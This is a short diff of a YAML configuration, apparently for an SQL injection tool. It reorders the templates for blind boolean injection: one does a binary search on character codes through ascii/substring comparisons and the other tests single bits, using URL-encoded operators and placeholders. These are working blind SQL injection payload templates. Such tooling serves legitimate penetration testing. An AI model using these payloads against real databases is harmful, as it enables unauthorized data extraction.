@@ -152,14 +152,6 @@ strategy:
 
  binary:
   test:
-   # engine uses collations for char comparison, not ascii, forcing ascii comparison
-   bin: |
-    ascii(substring(
-        ${injection},
-        ${window.char},
-        1
-    ))
-    %3E%3Dascii(char(${mid.int}))
    bit: |
     0 != (
         ascii(
@@ -171,6 +163,14 @@ strategy:
         )
         %26${bit}
     )
+   # engine uses collations for char comparison, not ascii, forcing ascii comparison
+   bin: |
+    ascii(substring(
+        ${injection},
+        ${window.char},
+        1
+    ))
+    %3E%3Dascii(char(${mid.int}))
   modeAnd: and
   modeOr: or
   blind: ${binary.mode} ${test}
